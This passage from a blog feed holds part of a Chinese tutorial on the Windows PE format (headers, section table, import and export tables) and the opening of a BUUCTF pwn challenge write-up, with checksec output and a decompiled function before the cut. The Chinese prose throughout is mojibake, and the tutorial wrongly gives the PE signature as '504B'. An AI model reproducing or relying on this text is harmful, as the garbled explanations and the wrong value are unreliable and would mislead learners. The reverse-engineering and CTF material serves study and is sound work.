be run in DOS mode.</code>é‚£é‡Œï¼Œ</p><h2 id="4-NTå¤´"><a href="#4-NTå¤´" class="headerlink" title="4.NTå¤´"></a>4.NTå¤´</h2><p>ä»¥ä¸‹ä¸º<code>notepad.exe</code>çš„NTå¤´ï¼š</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211019192747065.png" alt="image-20211019192747065"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> &#123;</span></span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>ç”±3éƒ¨åˆ†æ„æˆï¼šç­¾åï¼Œæ–‡ä»¶å¤´ï¼Œå¯é€‰å¤´</p><p>å…¶ä¸­Signatureå°±æ˜¯ä¸Šé¢çš„PE:<code>504B</code>ã€‚</p><p>ä¸‹é¢æ˜¯æ–‡ä»¶å¤´<code>IMAGE_FILE_HEADER</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD Machine;</span><br><span class="line">    WORD NumberOfSections; <span class="comment">//èŠ‚çš„æ•°ç›®</span></span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    DWORD PointerToSymbolTable; <span class="comment">//ç¬¦å·è¡¨çš„æ–‡ä»¶offset</span></span><br><span class="line">    DWORD NumberOfSymbols;      <span class="comment">//ç¬¦å·è¡¨ä¸­å…ƒç´ æ•°ç›®</span></span><br><span class="line">    WORD SizeOfOptionalHeader;  <span class="comment">//æŒ‡å‡ºä¸‹é¢ç»“æ„ä½“IMAGE_OPTIONAL_HEADER32ï¼ˆ32ä½ç³»ç»Ÿï¼‰çš„é•¿åº¦</span></span><br><span class="line">    WORD Characteristics;       <span class="comment">//æ ‡è¯†æ–‡ä»¶å±æ€§ï¼Œæ–‡ä»¶æ˜¯å¦æ˜¯å¯è¿è¡Œå½¢æ€ã€æ˜¯å¦ä¸ºDLLç­‰ï¼Œä»¥bit ORå½¢å¼è¿›è¡Œç»„åˆ</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯å¯é€‰å¤´ï¼š</p><p>å‰å‡ ä¸ªæ˜¯æ ‡å‡†ï¼Œåé¢çš„æ˜¯å¯é€‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD Magic; <span class="comment">//32ä½ä¸º0x10B,64ä½ä¸º0x20B</span></span><br><span class="line">    BYTE MajorLinkerVersion;</span><br><span class="line">    BYTE MinorLinkerVersion;</span><br><span class="line">    DWORD SizeOfCode;              <span class="comment">//ä»£ç èŠ‚(.test)å¤§å°ï¼Œæœ‰å¤šä¸ªçš„è¯æ˜¯æ€»å’Œ</span></span><br><span class="line">    DWORD SizeOfInitializedData;   <span class="comment">//å·²åˆå§‹åŒ–æ•°æ®èŠ‚çš„å¤§å°ï¼Œæœ‰å¤šä¸ªçš„è¯æ˜¯æ€»å’Œ</span></span><br><span class="line">    DWORD SizeOfUninitializedData; <span class="comment">//æœªåˆå§‹åŒ–æ•°æ®èŠ‚çš„å¤§å°ï¼Œæœ‰å¤šä¸ªçš„è¯æ˜¯æ€»å’Œ</span></span><br><span class="line">    DWORD AddressOfEntryPoint;     <span class="comment">//EPçš„RVAå€¼</span></span><br><span class="line">    DWORD BaseOfCode;              <span class="comment">//å†…å­˜ä¸­ä»£ç èŠ‚çš„å¼€å¤´ç›¸å¯¹äºæ˜ åƒåŸºå€çš„åç§»åœ°å€ã€‚</span></span><br><span class="line">    DWORD BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD ImageBase;        <span class="comment">//è½½å…¥å†…å­˜æ—¶ä¼˜å…ˆè£…è½½çš„åœ°å€</span></span><br><span class="line">    DWORD SectionAlignment; <span class="comment">//èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„æœ€å°å•ä½</span></span><br><span class="line">    DWORD FileAlignment;    <span class="comment">//èŠ‚åŒºåœ¨ç£ç›˜æ–‡ä»¶ä¸­çš„æœ€å°å•ä½</span></span><br><span class="line">    WORD MajorOperatingSystemVersion;</span><br><span class="line">    WORD MinorOperatingSystemVersion;</span><br><span class="line">    WORD MajorImageVersion;</span><br><span class="line">    WORD MinorImageVersion;</span><br><span class="line">    WORD MajorSubsystemVersion;</span><br><span class="line">    WORD MinorSubsystemVersion;</span><br><span class="line">    DWORD Win32VersionValue;</span><br><span class="line">    DWORD SizeOfImage;   <span class="comment">//æŒ‡å®šäº†PE Imageåœ¨è™šæ‹Ÿå†…å­˜ä¸­æ‰€å ç©ºé—´çš„å¤§å°ï¼ŒåŒ…å«æ‰€æœ‰å¤´</span></span><br><span class="line">    DWORD SizeOfHeaders; <span class="comment">//æ•´ä¸ªPEå¤´çš„å¤§å°</span></span><br><span class="line">    DWORD CheckSum;</span><br><span class="line">    WORD Subsystem;</span><br><span class="line">    WORD DllCharacteristics;</span><br><span class="line">    DWORD SizeOfStackReserve;</span><br><span class="line">    DWORD SizeOfStackCommit;</span><br><span class="line">    DWORD SizeOfHeapReserve;</span><br><span class="line">    DWORD SizeOfHeapCommit;</span><br><span class="line">    DWORD LoaderFlags;</span><br><span class="line">    DWORD NumberOfRvaAndSizes;                                            <span class="comment">//ä¸‹é¢æ•°ç»„çš„ä¸ªæ•°</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//16ä¸ª</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">//è¡¨çš„RVA</span></span><br><span class="line">    DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><h2 id="5-èŠ‚è¡¨"><a href="#5-èŠ‚è¡¨" class="headerlink" title="5.èŠ‚è¡¨"></a>5.èŠ‚è¡¨</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; <span class="comment">//8</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD PhysicalAddress;</span><br><span class="line">        DWORD VirtualSize; <span class="comment">//è½½å…¥å†…å­˜æ—¶æ­¤èŠ‚åŒºçš„å¤§å°</span></span><br><span class="line">    &#125; Misc;</span><br><span class="line">    DWORD VirtualAddress;   <span class="comment">//å†…å­˜ä¸­èŠ‚åŒºèµ·å§‹åœ°å€(RVA)</span></span><br><span class="line">    DWORD SizeOfRawData;    <span class="comment">//ç£ç›˜ä¸­èŠ‚åŒºæ‰€å å¤§å°</span></span><br><span class="line">    DWORD PointerToRawData; <span class="comment">//ç£ç›˜ä¸­æœ¬èŠ‚å¯¹äºæ–‡ä»¶å¤´çš„è·ç¦»</span></span><br><span class="line">    DWORD PointerToRelocations;</span><br><span class="line">    DWORD PointerToLinenumbers;</span><br><span class="line">    WORD NumberOfRelocations;</span><br><span class="line">    WORD NumberOfLinenumbers;</span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><h2 id="6-RVAä¸RAWåœ°å€è½¬æ¢"><a href="#6-RVAä¸RAWåœ°å€è½¬æ¢" class="headerlink" title="6.RVAä¸RAWåœ°å€è½¬æ¢"></a>6.RVAä¸RAWåœ°å€è½¬æ¢</h2><p><strong>RAW - PointerToRawData = RVA - VirtualAddress</strong></p><p><strong>RAW = RVA - VirtualAddress + PointerToRawData</strong></p><p>rva = RAW - PointerToRawData + VirtualAddress</p><h1 id="IATè¡¨åˆ†æ"><a href="#IATè¡¨åˆ†æ" class="headerlink" title="IATè¡¨åˆ†æ"></a>IATè¡¨åˆ†æ</h1><p>é¦–å…ˆæ˜¯INTå’ŒIATå¯¼å…¥çš„æ­¥éª¤ï¼š</p><ol><li> è¯»<code>IMAGE_IMPORT_DESCRIPTOR</code>çš„<code>Name</code>æˆå‘˜è·å–åº“åç§°çš„å­—ç¬¦ä¸²(æ¯”å¦‚â€™kernel32.dllâ€™)</li><li> è£…è½½ç›¸åº”çš„åº“ï¼ŒLoadLibrary(â€œkernel32.dllâ€)</li><li> è¯»<code>IMAGE_IMPORT_DESCRIPTOR</code>çš„<code>OriginalFirstThunk</code>æˆå‘˜ï¼Œè·å¾—INTè¡¨çš„åœ°å€</li><li> é€ä¸€è·å–INTæ•°ç»„çš„<code>IMAGE_IMPORT_BY_NAME</code>åœ°å€</li><li> ä½¿ç”¨<code>IMAGE_IMPORT_BY_NAME</code>çš„hintæˆ–è€…nameé¡¹ï¼Œè·å–ç›¸åº”å‡½æ•°çš„èµ·å§‹åœ°å€</li><li> è¯»<code>IMAGE_IMPORT_DESCRIPTOR</code>çš„<code>FirstThunk</code>(IAT)ï¼Œè·å–IATçš„åœ°å€</li><li> å°†ä¸Šé¢è·å¾—çš„å‡½æ•°åœ°å€è¾“å…¥ç›¸åº”çš„IATæ•°ç»„å€¼</li><li> é‡å¤4~7</li></ol><p>å¯¼å…¥è¡¨ã€å¯¼å…¥åœ°å€è¡¨(<code>IMPORT ADDRESS TABLE</code>)ï¼Œå¯¼å…¥è¡¨åœ¨ä¸Šé¢16ä¸ªæ•°ç»„çš„ç¬¬2ä¸ªã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DATA_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD VirtualAddress; <span class="comment">//è¯¥è¡¨çš„RVA</span></span><br><span class="line">    DWORD Size;</span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211020202318348.png" alt="image-20211020202318348"></p><p>å¯ä»¥çœ‹å‡ºå¯¼å…¥è¡¨çš„RVAä¸º0x2647Cï¼Œåœ¨.idataæ®µï¼Œ</p><p>é‚£ä¹ˆRAW= 0x2647C - 0x26000 + 0x23200 =0x2367C</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211021075308064.png" alt="image-20211021075308064"></p><p>æœ‰å¤šå°‘å¯¼å…¥çš„åº“å°±æœ‰å¤šå°‘<code>IMAGE_IMPORT_DESCRIPTOR</code>ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DWORD Characteristics;    <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD OriginalFirstThunk; <span class="comment">// INT address(RVA)ï¼Œæ•°ç»„ï¼ŒæŒ‡å‘IMAGE_IMPORT_BY_NAMEç»“æ„ä½“</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    DWORD ForwarderChain;</span><br><span class="line">    DWORD Name;       <span class="comment">//library name string address(RVA)</span></span><br><span class="line">    DWORD FirstThunk; <span class="comment">//IAT address(RVA)ï¼Œæ•°ç»„ï¼ŒæŒ‡å‘IMAGE_IMPORT_BY_NAMEç»“æ„ä½“</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;<span class="comment">//å¯èƒ½ä¸º0ï¼Œç¼–è¯‘å™¨å†³å®šï¼Œå¦‚æœä¸ä¸º0ï¼Œæ˜¯å‡½æ•°åœ¨å¯¼å‡ºè¡¨ä¸­çš„ç´¢å¼•</span></span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p>ç¨‹åºåŠ è½½å‰IATå’ŒINTéƒ½ä¹‹æŒ‡å‘åŒä¸€ä¸ªä½ç½®ã€‚</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/SouthEast.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><p>æ¯ä¸ªåº“åªæœ‰ä¸€ä¸ª<code>IMAGE_IMPORT_DESCRIPTOR</code>ï¼Œä½†æ˜¯æ¯ä¸ªè¯¥ç»“æ„ä½“çš„<code>INT(OriginalFirstThunk)</code>å’Œ<code>IAT(FirstThunk)</code>ä¸ºæ•°ç»„ï¼Œè¡¨ç¤ºè¯¥åº“æ‰€æœ‰å¯¼å…¥çš„APIçš„åœ°å€:</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211021075648706.png" alt="image-20211021075648706"></p><p>INTçš„RAW= 0x26700 -  0x26000 + 0x23200  = 0x23900</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211021080941861.png" alt="image-20211021080941861"></p><p>ä¸Šé¢éƒ½æ˜¯éœ€è¦å¯¼å…¥çš„INTçš„<code>IMAGE_IMPORT_BY_NAME</code>çš„åœ°å€ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ª0x26D3C:</p><p>RAW= 0x26D3C-  0x26000 + 0x23200 =0x23F3C</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211021081249113.png" alt="image-20211021081249113"></p><p>INTå°±æ˜¯ä¸Šé¢é‚£æ ·ï¼ŒIATä¹Ÿæ˜¯å¦‚æ­¤</p><p>ä¸Šé¢éƒ½æ˜¯å¯¼å…¥å‰ï¼Œå¯¼å…¥åINTä¸å˜ï¼ŒIATä¸ºå‡½æ•°çš„åœ°å€ï¼š</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/SouthEast.png" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><h1 id="å¯¼å‡ºè¡¨åˆ†æ"><a href="#å¯¼å‡ºè¡¨åˆ†æ" class="headerlink" title="å¯¼å‡ºè¡¨åˆ†æ"></a>å¯¼å‡ºè¡¨åˆ†æ</h1><p>åœ¨ä¸Šé¢16ä¸ªæ•°ç»„çš„ç¬¬ä¸€ä¸ªï¼Œè¿™é‡Œæ‹¿kernel32.dllæ¥æµ‹è¯•ï¼ˆnotepadæ²¡æœ‰å¯¼å‡ºè¡¨</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD Characteristics;</span><br><span class="line">    DWORD TimeDateStamp;</span><br><span class="line">    WORD MajorVersion;</span><br><span class="line">    WORD MinorVersion;</span><br><span class="line">    DWORD Name;                  <span class="comment">//è¦å¯¼å‡ºçš„åå­—çš„åœ°å€</span></span><br><span class="line">    DWORD Base;                  <span class="comment">//oridinal base</span></span><br><span class="line">    DWORD NumberOfFunctions;     <span class="comment">//å®é™…å¯¼å‡ºå‡½æ•°ä¸ªæ•°</span></span><br><span class="line">    DWORD NumberOfNames;         <span class="comment">//å¯¼å‡ºå‡½æ•°ä¸­æœ‰åå­—çš„ä¸ªæ•°</span></span><br><span class="line">    DWORD AddressOfFunctions;    <span class="comment">//å¯¼å‡ºå‡½æ•°çš„åœ°å€(æ•°ç»„ï¼ŒRVAï¼Œå…ƒç´ ä¸ªæ•°=NumberOfFunctions )</span></span><br><span class="line">    DWORD AddressOfNames;        <span class="comment">//å¯¼å‡ºå‡½æ•°çš„åç§°çš„åœ°å€(æ•°ç»„ï¼ŒRVAï¼Œå…ƒç´ ä¸ªæ•°=NumberOfNames)</span></span><br><span class="line">    DWORD AddressOfNameOrdinals; <span class="comment">//å¯¼å‡ºå‡½æ•°åºå·è¡¨çš„åœ°å€(æ•°ç»„ï¼ŒRVAï¼Œå…ƒç´ ä¸ªæ•°=NumberOfNames)ï¼Œå‡½æ•°åºå·è¡¨</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>è·å¾—å‡½æ•°åœ°å€çš„APIä¸ºï¼š<code>GetProcAddress</code>ï¼ŒåŸç†ï¼š</p><blockquote><ol><li> åˆ©ç”¨adressofnameè½¬åˆ°å‡½æ•°åç§°çš„æ•°ç»„</li><li> ä¸Šé¢çš„æ•°ç»„å­˜ç€çš„æ˜¯åœ°å€ï¼Œé€šè¿‡strcmpï¼ŒæŸ¥åˆ°æŒ‡å®šçš„å‡½æ•°åï¼Œè¿™æ—¶ç´¢å¼•è®°ä¸ºname_index</li><li> ç”¨addressofnameordinalsè½¬åˆ°ordinalæ•°ç»„ï¼Œ</li><li> é€šè¿‡name_indexæŸ¥æ‰¾ç›¸åº”indexå€¼</li><li> åˆ©ç”¨addressoffunctionè½¬åˆ° å‡½æ•°åœ°å€æ•°ç»„</li><li> ç”¨ordinalæ‰¾åˆ°éœ€è¦å‡½æ•°çš„åœ°å€ã€‚</li></ol></blockquote><p>å›¾èƒœåƒè¨€</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/1586953-20200217214947470-1447184500.png" alt="img"></p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/779730_7HXD6CYRBH5QTP4.jpg" alt="eat3"></p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/SouthEast.png" alt="img"></p><h2 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h2><p>ä¸‹é¢å®é™…æ‰¾ä¸€ä¸‹ï¼Œä½¿ç”¨kernel32.dllï¼Œæ‰¾AddConsoleAlisaAå‡½æ•°ï¼š</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102123648075.png" alt="image-20211102123648075"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AddressOfFunctions :   RVA = <span class="number">0x2654</span>  FOA = <span class="number">0x1A54</span></span><br><span class="line">AddressOfNames:        RVA = <span class="number">0x3538</span>  FOA = <span class="number">0x2938</span></span><br><span class="line">AddressOfNameOrdinals: RVA = <span class="number">0x441C</span>  FOA = <span class="number">0x381C</span></span><br></pre></td></tr></table></figure><h3 id="AddressOfName"><a href="#AddressOfName" class="headerlink" title="AddressOfName"></a>AddressOfName</h3><p>æ˜¯ä¸€ä¸ªä¸ªçš„RVAï¼Œä¸ªæ•°ä¸º0x953ï¼Œç»è¿‡è½¬æ¢ï¼ŒFOA = 0x2938ï¼š</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102123953820.png" alt="image-20211102123953820"></p><p>RVA = 4B9B ==&gt; FOA = 3F9B ï¼š</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102124237902.png" alt="image-20211102124237902"></p><p>æ˜¯ç¬¬4ä¸ªï¼Œç´¢å¼•ä¸º3ï¼Œ</p><h3 id="AddressOfNameOrdinals"><a href="#AddressOfNameOrdinals" class="headerlink" title="AddressOfNameOrdinals"></a>AddressOfNameOrdinals</h3><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102124406631.png" alt="image-20211102124406631"></p><p>ç´¢å¼•å’Œå€¼æ˜¯ä¸€æ ·çš„ï¼Œä¹Ÿæ˜¯ç¬¬4ä¸ªï¼Œä¸‹é¢æŸ¥åœ°å€ï¼š</p><h3 id="AddressOfFunctions"><a href="#AddressOfFunctions" class="headerlink" title="AddressOfFunctions"></a>AddressOfFunctions</h3><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102124531765.png" alt="image-20211102124531765"></p><p>ç¬¬4ä¸ªæ˜¯0x071cdfï¼Œkernel32.dllçš„imagebaseæ˜¯0x7c800000ï¼ŒåŠ èµ·æ¥æ˜¯â€™0x7c871cdfâ€™</p><p><img src="/2021/10/23/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E8%A7%A3%E6%9E%90/image-20211102124718782.png" alt="image-20211102124718782"></p><h1 id="é‡å®šä½è¡¨"><a href="#é‡å®šä½è¡¨" class="headerlink" title="é‡å®šä½è¡¨"></a>é‡å®šä½è¡¨</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;PEæ–‡ä»¶ç»“æ„è§£æ&quot;&gt;&lt;a href=&quot;#PEæ–‡ä»¶ç»“æ„è§£æ&quot; class=&quot;headerlink&quot; title=&quot;PEæ–‡ä»¶ç»“æ„è§£æ&quot;&gt;&lt;/a&gt;PEæ–‡ä»¶ç»“æ„è§£æ&lt;/h1&gt;&lt;h2 id=&quot;0-æ€»è¿°&quot;&gt;&lt;a href=&quot;#0-æ€»è¿°&quot; class=</summary>
      
    
    
    
    
    <category term="RE" scheme="http://example.com/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>BUU_PWNåˆ·é¢˜_0x40-0x4F</title>
    <link href="http://example.com/2021/10/17/BUU-PWN-0x40-0x4F/"/>
    <id>http://example.com/2021/10/17/BUU-PWN-0x40-0x4F/</id>
    <published>2021-10-16T16:00:00.000Z</published>
    <updated>2021-10-17T09:53:38.387Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="0x40-ciscn-2019-s-9"><a href="#0x40-ciscn-2019-s-9" class="headerlink" title="0x40.ciscn_2019_s_9"></a>0x40.ciscn_2019_s_9</h1><p>çœ‹ä¸‹æ£€æŸ¥,å…¨æ²¡å¼€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/Desktop$ checksec ./ciscn_s_9</span><br><span class="line">[*] &#x27;/home/yutao/Desktop/ciscn_s_9&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">24</span>]; <span class="comment">// [esp+8h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nHey! ^_^&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIt&#x27;s nice to meet you&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nDo you have anything to tell?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span 